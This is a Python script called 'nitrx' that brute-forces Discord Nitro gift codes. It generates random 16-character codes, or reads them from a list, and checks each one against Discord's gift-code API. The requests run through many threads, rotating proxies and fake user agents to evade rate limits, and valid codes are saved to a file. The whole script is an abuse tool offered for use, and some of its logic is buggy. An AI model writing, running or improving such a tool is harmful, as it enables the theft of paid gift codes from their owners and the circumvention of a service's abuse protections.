#!/usr/bin/env python

from requests.exceptions import ProxyError, SSLError, ConnectionError, InvalidProxyURL, ChunkedEncodingError
import multiprocessing
from threading import Thread
import fake_useragent
import platform
import requests
import random
import string
import json
import time
import re
import os

def config():
    try:
        with open(os.path.join(path, 'config.json'), 'r', encoding='utf-8') as setting:
            config = json.load(setting)
            proxies = config['proxies']
            debug = config['debug']
            output = config['output']
            timeout = config['timeout']
            return config
    except:
        print('Failed loading "config.json"')


path, _ = os.path.split(__file__)
config = config()
ua = fake_useragent.UserAgent()
proxy_file = open(config['proxies'], "r")
proxy_text = proxy_file.readlines()
reverse = str("\033[;7m")
green = str("\033[0;32m")
blue = str("\033[1;34m")
cyan = str("\033[1;36m")
reset = str("\033[0;0m")
yellow = str("\033[33m")
header = str("\033[95m")
red = str("\033[1;31m")
bold = str("\033[;1m")
not_checked = []

def headers():
    header = {
        'User-Agent' : ua.random,
        'content-type':'application/json',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }
    return header

def process():
    print("    [+] Process Running Successfully... \n")
    sec = 0
    while True:
        time.sleep(1)
        sec += 1
        if str(sec).endswith("00"):
            os.system("clear")

def proxies():
    line = random.choice(proxy_text)
    ip = line.replace('\n', '')
    if str(ip).startswith('http'):
        pass
    else:
        https = "https://"+ip
        http = "http://"+ip
    proxy = {
        "https":https,
        "http":http
    }
    return proxy

def code():
    if option == 2:
        try:
            line = random.choice(codes)
            code = line.replace('\n', '')
            codes.remove(line)
        except IndexError:
            code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
    else:
        code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
    return code

def save(code):
    file = open(config['output'], 'a')
    write_code = code + "\n"
    file.write(write_code)
    file.close()

def debug(code, text, proxy, show):
    try:
        line = blue + proxy['http'].split('//')[1]
        host = blue + str(line.split(':')[0])
        port = blue + str(line.split(':')[1])
    except:
        return
    if show.lower() == 'error' or show.lower() == 'message':
        not_checked.append(code)
        if config['debug'] == False:
            return
        text = red + text + reset
    if 'Invalid' in text:
        text = yellow + text + reset
    elif 'Valid' in text:
        text = green + text + reset
    code = header + code + reset
    logo = str(blue + "[" + red + "nitrx" + blue + "]" + reset)
    print('{0:16} {1:26} {2:18} {3:22}'.format(logo, code, text, line))

def nitrx(code, headers, proxy):
    try:
        global running
        running += 1
    except:
        running = 0
    s = requests.session()
    s.proxies = proxy
    url = "https://discordapp.com/api/v6/entitlements/gift-codes/{}?with_application=false&with_subscription_plan=true".format(code)
    try:
        rr = s.get(url, headers=headers, timeout=config['timeout'])
        if "subscription_plan".lower() in (rr.text).lower():
            save(code)
            debug(code, "Valid", proxy, "Valid")
            running -= 1
            exit()
        o = json.loads(rr.text)
        message = o["message"].lower()
        if message == "Unknown Gift Code".lower():
            debug(code, "Invalid", proxy, 'Invalid')
        elif message == "You are being rate limited.".lower():
            debug(code, "Message", proxy, 'Message')
        elif message == "Access denied":
            debug(code, "Message", proxy, 'Message')
        else:
            print(rr.text)

    except KeyboardInterrupt:
        exit("[*] GoodBye")
    except ProxyError:
        debug(code, "Proxy", proxy, 'Error')
    except SSLError:
        debug(code, "SSL", proxy, 'Error')
    except ConnectionError:
        debug(code, "Connect", proxy, 'Error')
    except InvalidProxyURL:
        debug(code, "Proxy URL", proxy, 'Error')
    except requests.exceptions.ReadTimeout:
        debug(code, "Timeout", proxy, 'Error')
    except UnicodeError:
        debug(code, "UnicodeError", proxy, 'Error')
    except ChunkedEncodingError:
        debug(code, "Encoding", proxy, 'Error')
    except json.decoder.JSONDecodeError:
        debug(code, "J.Decode", proxy, 'Decode')

    running -= 1
    exit()

if __name__ == '__main__':
    try:
        msg = f""" {header}
        ███╗   ██╗██╗████████╗██████╗ ██╗  ██╗
        ████╗  ██║██║╚══██╔══╝██╔══██╗╚██╗██╔╝
        ██╔██╗ ██║██║   ██║   ██████╔╝ ╚███╔╝ 
        ██║╚██╗██║██║   ██║   ██╔══██╗ ██╔██╗    V 2
        ██║ ╚████║██║   ██║   ██║  ██║██╔╝ ██╗
        ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝\n
                    {yellow}By {cyan}Twitter {red}Squuv \n

        {red}1{green}- {yellow}[{reset}Auto{yellow}]{blue} Generator and Scann
        {red}2{green}- {blue}Check Codes From {yellow}[{reset}LIST{yellow}]
        """

        for l in msg:
            time.sleep(.005)
            print(l, end='')
        try:
            option = int(input("\n" + red + "    [?] Chose : "+cyan))
        except:
            exit('    [?] Invalid option..')
        if option == 2:
            file = input("    [?] File : ")
            codes = open(file, "r")
            codes = codes.readlines()
        print(green+"    [?] Table info : Code - Status - Proxy")
        mythreads = []
        pr = multiprocessing.Process(target=process)
        pr.start()
        running = 0
        while True:
            if running <= config["threads"]:
                x = Thread(target=nitrx, args=(code(), headers(), proxies(),))
                mythreads.append(x)
                x.start()
            else:
                time.sleep(1)
                for unchecked_code in not_checked:
                    x = Thread(target=nitrx, args=(code(), headers(), proxies(),))
                    mythreads.append(x)
                    x.start()
                    not_checked.remove(unchecked_code)
    except KeyboardInterrupt:
        exit("\tGoodBye")
    except FileNotFoundError:
        exit("\tInvalid File Path")